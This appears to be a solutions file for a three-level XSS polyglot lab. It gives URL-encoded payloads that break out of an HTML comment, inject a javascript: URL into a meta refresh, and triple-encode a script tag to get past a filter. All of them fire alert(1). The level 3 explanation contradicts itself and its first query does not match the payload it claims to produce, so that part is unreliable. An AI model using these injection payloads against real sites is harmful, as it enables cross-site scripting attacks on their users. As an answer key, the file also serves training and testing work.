# polyglot — solutions

Single-context polyglot challenges (HTML comment, meta refresh URL, multi-decode).

### polyglot-level1

`/polyglot/level1/?query=--%3E%3Csvg%20onload%3Dalert(1)%3E`

- payload: `--><svg onload=alert(1)>`
- context: inside <!-- QUERY -->; close comment then inject

### polyglot-level2

`/polyglot/level2/?query=javascript%3Aalert(1)`

- payload: `javascript:alert(1)`
- context: <meta http-equiv=refresh content="0;url=QUERY">

### polyglot-level3

`/polyglot/level3/?query=%25252Fscript%25253Ealert(1)%25253C%25252Fscript%25253E`

Note: server URL-decodes three times. To survive the post-second-decode `<` check we provide a payload whose final decode produces a `<` only after the check. Easier path: rely on third decode of `<`:

- payload (after 3 decodes): `<script>alert(1)</script>`
- raw query (triple-encoded `<` only): `%25253Cscript%25253Ealert(1)%25253C%25252Fscript%25253E`
- context: server decodes twice and rejects `<`; third decode emits `<` to body
